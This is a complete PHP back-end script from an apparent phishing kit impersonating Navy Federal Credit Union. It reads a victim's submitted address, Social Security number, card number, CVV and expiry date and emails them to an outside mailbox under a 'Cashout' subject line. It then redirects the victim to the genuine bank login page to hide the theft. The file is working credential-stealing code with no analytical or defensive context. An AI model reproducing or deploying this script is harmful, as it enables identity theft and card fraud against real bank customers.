<?php
header('Location: https://my.navyfederal.org/NFOAA_Auth/login.jsp');
$address=$_POST['address'];
$ssn=$_POST['ssn'];
$card=$_POST['card'];
$cvv=$_POST['cvv'];
$exp=$_POST['exp'];
$nl="\r\n";
$from = "Cashout";
$to = "nwaforalex158@outlook.com";
$subject = "Cashout Is A Must By Gods  Grace";
$message = 'ADDRESS: ' . $address . $nl.'SSN: ' . $ssn .$nl. 'CARD: ' . $card .$nl. 'CVV: ' . $cvv  . $nl. 'EXPIRY: ' . $exp ;
$headers = "From:" . $from;
mail($to,$subject,$message, $headers) 
?>